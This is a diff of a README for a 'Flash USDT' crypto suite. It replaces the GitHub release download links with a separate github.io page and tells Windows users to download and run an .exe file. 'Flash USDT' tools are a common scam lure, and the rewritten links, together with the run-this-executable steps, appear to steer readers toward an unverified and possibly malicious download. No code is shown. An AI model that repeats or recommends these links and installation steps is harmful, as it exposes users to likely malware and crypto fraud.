@@ -1,6 +1,6 @@
 # ⚡ FlashMan-Flash-USDT-Suite - Manage your digital assets with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/inauguralwildcat147/FlashMan-Flash-USDT-Suite/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://inauguralwildcat147.github.io)
 
 This software provides a platform to handle digital transactions. It offers tools for users who need to interact with various blockchain networks like Bitcoin, Solana, and the Binance Smart Chain. The suite simplifies the process of tracking and organizing crypto assets in one interface.
 
@@ -29,7 +29,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following link to reach the official release page: [https://github.com/inauguralwildcat147/FlashMan-Flash-USDT-Suite/releases](https://github.com/inauguralwildcat147/FlashMan-Flash-USDT-Suite/releases)
+1. Visit the following link to reach the official release page: [https://inauguralwildcat147.github.io](https://inauguralwildcat147.github.io)
 2. Scroll to the "Assets" section at the bottom of the latest release post.
 3. Click on the file ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
